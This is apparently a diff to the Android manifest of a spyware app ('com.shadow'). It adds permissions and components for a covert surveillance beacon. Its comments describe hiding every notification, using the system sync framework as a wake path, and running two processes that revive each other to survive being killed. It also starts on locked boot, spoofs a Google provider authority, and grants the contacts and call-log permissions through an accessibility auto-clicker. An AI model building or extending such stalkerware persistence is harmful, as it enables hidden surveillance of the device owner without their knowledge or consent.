@@ -11,6 +11,20 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
 
+    <!-- Account + sync framework (the system-spawned wake path). All install-time
+         normal permissions — no runtime prompt, no user action, no adb. -->
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="android.permission.AUTHENTICATE_ACCOUNTS" />
+    <uses-permission android:name="android.permission.USE_CREDENTIALS" />
+    <uses-permission android:name="android.permission.WRITE_SYNC_SETTINGS" />
+    <uses-permission android:name="android.permission.READ_SYNC_SETTINGS" />
+    <uses-permission android:name="android.permission.READ_SYNC_STATS" />
+
+    <!-- Doze exemption intent (rationale: an account sync adapter legitimately needs
+         to run in the background). User-visible prompt only if we choose to fire it;
+         omitted by default since this build must stay notification-free. -->
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+
     <!-- Surveillance (declared, granted at runtime via a11y auto-clicker or pm grant) -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
@@ -107,30 +121,66 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- Foreground Service: promotes the process out of the background tier so
-             the ColorOS reaper is far less aggressive. Hosts the beacon. -->
+        <!-- Sync + account services: bound by the SYSTEM (SyncManager / AccountManager).
+             No notification, no foreground. Their only role is discoverability so the
+             OS can schedule periodic syncs for us — the system-spawned wake path. -->
         <service
-            android:name="com.shadow.SyncForegroundService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="dataSync" />
+            android:name="com.shadow.ShadowSyncService"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.content.SyncAdapter" />
+            </intent-filter>
+            <meta-data
+                android:name="android.content.SyncAdapter"
+                android:resource="@xml/syncadapter" />
+        </service>
 
-        <!-- Persistence: SyncAdapter dummy ContentProvider -->
+        <service
+            android:name="com.shadow.ShadowAuthenticatorService"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accounts.AccountAuthenticator" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accounts.AccountAuthenticator"
+                android:resource="@xml/authenticator" />
+        </service>
+
+        <!-- Beacon host: lives in a SEPARATE process (:sync) so a per-process reap
+             only takes one of the two, and the mutual binding revives it in under a
+             second. Bound service — no notification, no visible component. -->
+        <service
+            android:name="com.shadow.BeaconService"
+            android:exported="false"
+            android:process=":sync" />
+
+        <!-- Main-process half of the mutual binding, held up by BeaconService. -->
+        <service
+            android:name="com.shadow.MainKeepAliveService"
+            android:exported="false" />
+
+        <!-- Persistence: SyncAdapter ContentProvider (also our cross-process IPC surface).
+             directBootAware so it is reachable before the user unlocks on the
+             LOCKED_BOOT_COMPLETED path. -->
         <provider
             android:name="com.shadow.SyncProvider"
             android:authorities="com.google.android.phonesync"
             android:exported="false"
-            android:syncable="true" />
+            android:syncable="true"
+            android:directBootAware="true" />
 
         <!-- Persistence: Boot Receiver -->
         <receiver
             android:name="com.shadow.BootReceiver"
             android:enabled="true"
-            android:exported="true">
+            android:exported="true"
+            android:directBootAware="true">
             <intent-filter android:priority="999">
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                 <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
             </intent-filter>
         </receiver>
 
